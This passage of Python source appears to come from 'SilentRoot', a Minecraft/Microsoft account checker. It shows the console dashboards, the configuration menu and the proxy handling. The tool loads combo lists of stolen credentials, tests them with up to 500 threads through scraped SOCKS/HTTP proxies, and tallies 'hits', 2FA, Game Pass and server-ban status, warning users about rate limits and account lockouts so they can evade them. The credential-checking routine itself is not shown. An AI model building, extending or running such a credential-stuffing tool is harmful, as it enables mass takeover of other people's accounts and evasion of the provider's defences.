    print(f"{Fore.CYAN}║ {Fore.LIGHTYELLOW_EX}OTHER:       {Fore.WHITE}{other:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTMAGENTA_EX}MAIL:        {Fore.WHITE}{vm:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.YELLOW}RETRY:       {Fore.WHITE}{retries:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.GREEN}DONUT CLEAN: {Fore.WHITE}{donut_unbanned:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.RED}DONUT BANNED:{Fore.WHITE}{donut_banned:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # Update window title with comprehensive stats
    utils.set_title(f"SilentRoot | {checked}/{len(Combos)} ({progress:.1f}%) | Hits: {hits} | CPM: {cpm1:.1f} | ETA: {eta_display}")
    
    time.sleep(0.5)  # Faster updates for better responsiveness
    # Only continue if checking is not complete
    if checked < len(Combos):
        threading.Thread(target=cuiscreen).start()

def logscreen():
    """Detailed Log Screen from backup version"""
    global cpm, cpm1, start_time
    
    # 100% Accurate CPM calculation with real-time precision
    current_time = time.time()
    
    # Initialize tracking variables if first run
    if not hasattr(logscreen, 'start_time'):
        logscreen.start_time = start_time
        logscreen.start_checked = 0
        logscreen.last_update = current_time
        logscreen.last_checked = checked
        logscreen.cpm_samples = []
    
    # Calculate overall CPM (most accurate for long runs)
    total_elapsed = current_time - logscreen.start_time
    total_checks = checked - logscreen.start_checked
    overall_cpm = (total_checks / (total_elapsed / 60)) if total_elapsed > 0 else 0
    
    # Calculate recent CPM (for responsiveness)
    time_diff = current_time - logscreen.last_update
    if time_diff >= 0.5:  # Update every 0.5 seconds for better accuracy
        checks_diff = checked - logscreen.last_checked
        recent_cpm = (checks_diff / (time_diff / 60)) if time_diff > 0 else 0
        
        # Store recent samples for smoothing
        logscreen.cpm_samples.append(recent_cpm)
        if len(logscreen.cpm_samples) > 20:  # Keep last 20 samples (10 seconds)
            logscreen.cpm_samples.pop(0)
        
        # Use weighted average: 70% overall CPM + 30% recent average
        recent_avg = sum(logscreen.cpm_samples) / len(logscreen.cpm_samples) if logscreen.cpm_samples else 0
        cpm1 = (overall_cpm * 0.7) + (recent_avg * 0.3) if total_elapsed > 10 else recent_avg
        
        logscreen.last_update = current_time
        logscreen.last_checked = checked
    else:
        cpm1 = getattr(logscreen, 'last_cpm', overall_cpm)
    
    logscreen.last_cpm = cpm1
    
    # Calculate statistics with maximum precision
    progress = (checked / len(Combos) * 100.0) if len(Combos) > 0 else 0.0
    success_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    
    # Enhanced ETA calculation
    elapsed_time = current_time - start_time if 'start_time' in globals() else 0
    remaining = len(Combos) - checked
    
    if cpm1 > 0 and remaining > 0:
        eta_seconds = (remaining / cpm1) * 60
        eta_hours = int(eta_seconds // 3600)
        eta_minutes = int((eta_seconds % 3600) // 60)
        eta_secs = int(eta_seconds % 60)
        eta_display = f"{eta_hours:02d}:{eta_minutes:02d}:{eta_secs:02d}" if eta_hours > 0 else f"{eta_minutes:02d}:{eta_secs:02d}"
    else:
        eta_display = "Calculating..."
    
    # Format elapsed time
    elapsed_hours = int(elapsed_time // 3600)
    elapsed_minutes = int((elapsed_time % 3600) // 60)
    elapsed_secs = int(elapsed_time % 60)
    elapsed_display = f"{elapsed_hours:02d}:{elapsed_minutes:02d}:{elapsed_secs:02d}" if elapsed_hours > 0 else f"{elapsed_minutes:02d}:{elapsed_secs:02d}"
    
    # Create progress bar
    bar_length = 50
    filled_length = int(bar_length * progress / 100)
    bar = '█' * filled_length + '░' * (bar_length - filled_length)
    
    # Clear screen and display modern UI
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Header
    print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.GREEN}{Style.BRIGHT}                        CHECKING IN PROGRESS                                    {Fore.WHITE}║")
    print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    # Progress Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Progress{Fore.CYAN} ─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}{bar} {Fore.WHITE}{progress:6.2f}% {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}Checked: {Fore.WHITE}{checked:>6}/{len(Combos):<6} {Fore.CYAN}│ {Fore.GREEN}CPM: {Fore.WHITE}{cpm1:6.1f} {Fore.CYAN}│ {Fore.MAGENTA}ETA: {Fore.WHITE}{eta_display:>8} {Fore.CYAN}│ {Fore.BLUE}Elapsed: {Fore.WHITE}{elapsed_display:>8} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # Results Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Live Results{Fore.CYAN} ─────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}HITS: {Fore.WHITE}{hits:>6} {Fore.CYAN}│ {Fore.RED}BAD: {Fore.WHITE}{bad:>6} {Fore.CYAN}│ {Fore.YELLOW}SUCCESS: {Fore.WHITE}{success_rate:>5.1f}% {Fore.CYAN}│ {Fore.MAGENTA}2FA: {Fore.WHITE}{twofa:>6} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}SFA: {Fore.WHITE}{sfa:>7} {Fore.CYAN}│ {Fore.CYAN}MFA: {Fore.WHITE}{mfa:>6} {Fore.CYAN}│ {Fore.LIGHTMAGENTA_EX}MAIL: {Fore.WHITE}{vm:>7} {Fore.CYAN}│ {Fore.LIGHTYELLOW_EX}OTHER: {Fore.WHITE}{other:>5} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # Gaming & Services Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Gaming & Services{Fore.CYAN} ────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.BLUE}XGP: {Fore.WHITE}{xgp:>7} {Fore.CYAN}│ {Fore.LIGHTBLUE_EX}XGPU: {Fore.WHITE}{xgpu:>5} {Fore.CYAN}│ {Fore.GREEN}DONUT CLEAN: {Fore.WHITE}{donut_unbanned:>5} {Fore.CYAN}│ {Fore.RED}DONUT BANNED: {Fore.WHITE}{donut_banned:>5} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # System Stats Section
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}System Performance{Fore.CYAN} ───────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}RETRIES: {Fore.WHITE}{retries:>5} {Fore.CYAN}│ {Fore.RED}ERRORS: {Fore.WHITE}{errors:>5} {Fore.CYAN}│ {Fore.GREEN}THREADS: {Fore.WHITE}{thread:>5} {Fore.CYAN}│ {Fore.MAGENTA}PROXIES: {Fore.WHITE}{len(proxylist):>5} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    # Status indicator
    if cpm1 > 0:
        if cpm1 > 100:
            status_color = Fore.GREEN
            status_text = "EXCELLENT PERFORMANCE"
        elif cpm1 > 50:
            status_color = Fore.YELLOW
            status_text = "GOOD PERFORMANCE"
        else:
            status_color = Fore.RED
            status_text = "SLOW PERFORMANCE"
        print(f"{status_color}● {Fore.WHITE}{status_text} - {remaining} accounts remaining{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}● {Fore.WHITE}INITIALIZING CHECKER...{Style.RESET_ALL}")
    
    # Update window title
    utils.set_title(f"SilentRoot | {checked}/{len(Combos)} ({progress:.1f}%) | Hits: {hits} | CPM: {cpm1:.1f} | ETA: {eta_display}")
    
    time.sleep(0.5)
    # Only continue if checking is not complete
    if checked < len(Combos):
        threading.Thread(target=logscreen).start()

def finishedscreen():
    """End Screen from backup version"""
    global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, donut_banned, donut_unbanned, checked
    os.system('cls')
    print(logo)
    print()
    print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.GREEN}{Style.BRIGHT}                        CHECKING COMPLETE!                                      {Fore.WHITE}║")
    print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    # Calculate success rate
    success_rate = (hits / checked * 100) if checked > 0 else 0
    
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Results Summary{Fore.CYAN} ──────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}✅ HITS: {Fore.WHITE}{hits:<8} {Fore.CYAN}│ {Fore.RED}❌ BAD: {Fore.WHITE}{bad:<8} {Fore.CYAN}│ {Fore.YELLOW}📊 SUCCESS: {Fore.WHITE}{success_rate:.1f}%{' '*(6-len(f'{success_rate:.1f}'))} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.MAGENTA}🔒 2FA :{Fore.WHITE} {twofa:<12} {Fore.CYAN}│ {Fore.YELLOW}📧 SFA:{Fore.WHITE} {sfa:<8} {Fore.CYAN}│ {Fore.CYAN}🔓 MFA:{Fore.WHITE} {mfa:<16} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.BLUE}🎮 XGP:{Fore.WHITE} {xgp:<12} {Fore.CYAN}│ {Fore.LIGHTBLUE_EX}🎯 XGPU:{Fore.WHITE} {xgpu:<7} {Fore.CYAN}│ {Fore.LIGHTMAGENTA_EX}📬 Mail:{Fore.WHITE} {vm:<14} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}✓ Donut Unbanned:{Fore.WHITE} {donut_unbanned:<8} {Fore.CYAN}│ {Fore.RED}✗ Donut Banned:{Fore.WHITE} {donut_banned:<18} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Performance Stats{Fore.CYAN} ────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.YELLOW}📋 Checked:{Fore.WHITE} {checked}/{len(Combos):<8} {Fore.CYAN}│ {Fore.YELLOW}🔄 Retries:{Fore.WHITE} {retries:<8} {Fore.CYAN}│ {Fore.YELLOW}⚠️ Errors:{Fore.WHITE} {errors:<11} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}⚡ CPM:{Fore.WHITE} {cpm1:<12.1f} {Fore.CYAN}│ {Fore.CYAN}🧵 Threads:{Fore.WHITE} {thread:<7} {Fore.CYAN}│ {Fore.MAGENTA}🌐 Proxies:{Fore.WHITE} {len(proxylist):<10} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.GREEN}💾 RESULTS SAVED TO: {Fore.CYAN}results/{fname}/{Style.RESET_ALL}")
    
    # Export results if enabled
    export_results()
    
    print()
    print(f"{Fore.YELLOW}Press any key to exit...{Style.RESET_ALL}")
    try:
        import msvcrt
        msvcrt.getch()
    except:
        input()

def Main():
    """Main Configuration Screen from backup version"""
    global proxytype, screen, thread, banproxies
    utils.set_title("SilentRoot - Advanced MC Checker")
    os.system('cls')
    
    try:
        loadconfig()
    except:
        print(Fore.RED + Style.BRIGHT + "There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen SilentRoot." + Style.RESET_ALL)
        input()
        exit()
    
    print(logo)
    print()
    
    print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.WHITE}{Style.BRIGHT}                          CONFIGURATION SETUP                                   {Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    try:
        print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Thread Recommendations{Fore.CYAN} ─────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW}  • Proxyless: 1-10 threads (avoid rate limits)                               {Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW}  • With Proxies: 10-200 threads (depends on proxy quality)                   {Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW}  • High Quality Proxies: 200-500 threads (premium proxies only)              {Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        print()
        thread = int(input(f"{Fore.GREEN}► {Fore.WHITE}Threads (1-500): {Style.RESET_ALL}"))
        if thread < 1 or thread > 500:
            print(Fore.RED + Style.BRIGHT + "Threads must be between 1 and 500." + Style.RESET_ALL)
            time.sleep(2)
            Main()
    except:
        print(Fore.RED + Style.BRIGHT + "Must be a valid number between 1-500." + Style.RESET_ALL)
        time.sleep(2)
        Main()
    
    print()
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Proxy Type{Fore.CYAN} ──────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}[1]{Fore.WHITE} Http/s  {Fore.CYAN}│  {Fore.GREEN}[2]{Fore.WHITE} Socks4  {Fore.CYAN}│  {Fore.GREEN}[3]{Fore.WHITE} Socks5  {Fore.CYAN}│  {Fore.GREEN}[4]{Fore.WHITE} None  {Fore.CYAN}│  {Fore.GREEN}[5]{Fore.WHITE} Auto Scraper  {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└──────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(f"{Fore.RED}✗ Invalid Proxy Type [{cleaned}]{Style.RESET_ALL}")
        time.sleep(2)
        Main()
    
    print()
    print(f"{Fore.CYAN}┌─ {Fore.WHITE}{Style.BRIGHT}Screen Mode{Fore.CYAN} ──────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│  {Fore.GREEN}[1]{Fore.WHITE} CUI (Compact)  {Fore.CYAN}│  {Fore.GREEN}[2]{Fore.WHITE} Log (Detailed)                                  {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
    screen = repr(readchar.readkey())
    
    print()
    print(f"{Fore.GREEN}► SELECT COMBO FILE: {Fore.WHITE}Choose your combo file...{Style.RESET_ALL}")
    Load()
    if proxytype == "'5'":
        print(Fore.RED + Style.BRIGHT + "Auto Scraper selected - Scraping proxies..." + Style.RESET_ALL)
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    elif proxytype != "'4'":
        print(Fore.RED + Style.BRIGHT + "Select your proxies" + Style.RESET_ALL)
        Proxys()
    
    # Enhanced ban proxy handling with auto scraping
    if config.get('proxylessban') is False and config.get('hypixelban') is True:
        if config.get('differentproxy'):
            print(Fore.RED + Style.BRIGHT + "Ban Proxy Options: [1] Manual File [2] Auto Scrape SOCKS" + Style.RESET_ALL)
            ban_choice = repr(readchar.readkey())
            if ban_choice == "'1'":
                print(Fore.RED + Style.BRIGHT + "Select your SOCKS5 Ban Checking Proxies." + Style.RESET_ALL)
                banproxyload()
            elif ban_choice == "'2'":
                get_ban_proxies()
            else:
                print(Fore.RED + Style.BRIGHT + "Invalid choice, auto-scraping SOCKS proxies..." + Style.RESET_ALL)
                get_ban_proxies()
        else:
            # When sharing proxies, avoid scraping here in proxyless mode; let proxyless handler manage it
            if proxytype == "'4'":
                pass
            else:
                try:
                    shared_socks5 = []
                    # proxylist may contain dicts (auto-scraper) or raw strings (manual file)
                    for p in proxylist:
                        if isinstance(p, dict):
                            val = p.get('http') or p.get('https')
                            if isinstance(val, str) and val.startswith('socks5://'):
                                host_port = val.replace('socks5://', '')
                                shared_socks5.append(host_port)
                        elif isinstance(p, str):
                            # Accept plain ip:port only for SOCKS5 by best-effort validation
                            if ':' in p:
                                shared_socks5.append(p)
                    if len(shared_socks5) == 0:
                        # Fallback to auto-scrape dedicated SOCKS if none available, but only if not already loaded
                        if len(banproxies) == 0:
                            get_ban_proxies()
                    else:
                        banproxies.extend(shared_socks5)
                except Exception:
                    # Defensive fallback, avoid duplicate scrape
                    if len(banproxies) == 0:
                        get_ban_proxies()
    
    # Auto-scrape SOCKS5 proxies for ban checking when using proxyless mode
    if proxytype == "'4'" and config.get('hypixelban') is True and config.get('proxylessban') is False:
        print(Fore.CYAN + Style.BRIGHT + "\n🔍 Proxyless mode detected" + Style.RESET_ALL)
        if len(banproxies) == 0:
            get_ban_proxies()
        if len(banproxies) > 0:
            print(Fore.GREEN + Style.BRIGHT + f"✅ Loaded {len(banproxies)} SOCKS5 proxies for ban checking!" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + Style.BRIGHT + "⚠️  No ban proxies found - Ban checks will be proxyless (may fail)" + Style.RESET_ALL)
    
    # Enhanced warning for high threads in proxyless mode
    if proxytype == "'4'" and thread >= 20:
        print()
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{Fore.YELLOW}{Style.BRIGHT}                              ⚠️  CRITICAL WARNING ⚠️                             {Fore.WHITE}║")
        print(f"╠══════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
        print(f"{Fore.RED}║ {Fore.WHITE}You are about to use {Fore.YELLOW}{Style.BRIGHT}{thread} threads{Fore.WHITE} in {Fore.YELLOW}{Style.BRIGHT}PROXYLESS MODE{Fore.WHITE}                                {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║                                                                                  ║{Style.RESET_ALL}")
        print(f"{Fore.RED}║ {Fore.YELLOW}This configuration is EXTREMELY RISKY and may cause:{Fore.WHITE}                             {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• IP Rate Limiting / Temporary Bans{Fore.WHITE}                                            {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• Microsoft Account Lockouts{Fore.WHITE}                                                   {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• Connection Failures & Errors{Fore.WHITE}                                                 {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.RED}• Inaccurate Results{Fore.WHITE}                                                           {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║                                                                                  ║{Style.RESET_ALL}")
        print(f"{Fore.RED}║ {Fore.GREEN}Recommended Options:{Fore.WHITE}                                                             {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}║   {Fore.GREEN}✓ Reduce threads to 5-10 for proxyless{Fore.WHITE}                                         {Fore.RED}║{Style.RESET_ALL}")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print()
        confirm = input(f"{Fore.RED}{Style.BRIGHT}Are you ABSOLUTELY SURE you want to continue with {thread} threads? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() not in ['yes', 'y']:
            print(f"{Fore.CYAN}Returning to configuration...{Style.RESET_ALL}")
            time.sleep(1)
            Main()
    elif proxytype == "'4'" and thread > 10:
        print(Fore.YELLOW + Style.BRIGHT + f"⚠️  WARNING: Using {thread} threads without proxies may cause rate limiting!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Recommended: Use proxies or reduce threads to 5-10 for proxyless mode." + Style.RESET_ALL)
        confirm = input(Fore.RED + "Continue anyway? (y/n): " + Style.RESET_ALL)
        if confirm.lower() != 'y':
            Main()
    
    # Adjust max retries based on thread count
    global maxretries
    if thread <= 10:
        pass  # Keep default (3)
    elif thread <= 30:
        maxretries = 4
        print(Fore.CYAN + f"Max retries adjusted to {maxretries} for {thread} threads" + Style.RESET_ALL)
    elif thread <= 50:
        maxretries = 5
        print(Fore.CYAN + f"Max retries adjusted to {maxretries} for {thread} threads" + Style.RESET_ALL)
    elif thread <= 100:
        maxretries = 6
        print(Fore.CYAN + f"Max retries adjusted to {maxretries} for {thread} threads" + Style.RESET_ALL)
    elif thread <= 200:
        maxretries = 5  # Reduce retries for high threads to fail faster
        print(Fore.CYAN + f"Max retries adjusted to {maxretries} for {thread} threads (fast fail mode)" + Style.RESET_ALL)
    else:  # 200-500
        maxretries = 3  # Very high threads need minimal retries
        print(Fore.CYAN + f"Max retries adjusted to {maxretries} for {thread} threads (ultra fast fail mode)" + Style.RESET_ALL)
    
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    
    # Initialize start time for accurate CPM and ETA calculations
    global start_time
    start_time = time.time()
    
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()

if __name__ == "__main__":
    Main()  